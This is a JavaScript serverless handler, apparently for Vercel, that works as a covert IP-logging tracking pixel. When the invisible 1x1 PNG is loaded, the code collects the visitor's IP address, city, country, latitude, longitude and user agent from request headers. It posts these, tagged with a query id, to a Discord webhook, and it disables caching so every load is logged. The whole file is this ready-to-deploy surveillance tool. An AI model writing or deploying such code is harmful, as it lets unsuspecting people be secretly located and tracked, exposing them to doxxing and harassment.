export default async function handler(req, res) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  const city = req.headers['x-vercel-ip-city'] || 'unknown';
  const country = req.headers['x-vercel-ip-country'] || 'unknown';
  const lat = req.headers['x-vercel-ip-latitude'] || 'unknown';
  const lon = req.headers['x-vercel-ip-longitude'] || 'unknown';
  const ua = req.headers['user-agent'] || 'unknown';
  const id = req.query.id || 'unknown';

  const webhook = process.env.DISCORD_WEBHOOK;
  if (webhook) {
    const content = `**IP Log**\nID: ${id}\nIP: ${ip}\nCity: ${city}\nCountry: ${country}\nLat/Lon: ${lat}, ${lon}\nUA: ${ua}`;
    await fetch(webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content })
    }).catch(() => {});
  }

  // 1x1 transparent PNG
  const png = Buffer.from(
    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAFgwJ/lZ0kAAAAAElFTkSuQmCC',
    'base64'
  );
  res.setHeader('Content-Type', 'image/png');
  res.setHeader('Cache-Control', 'no-store');
  res.send(png);
}
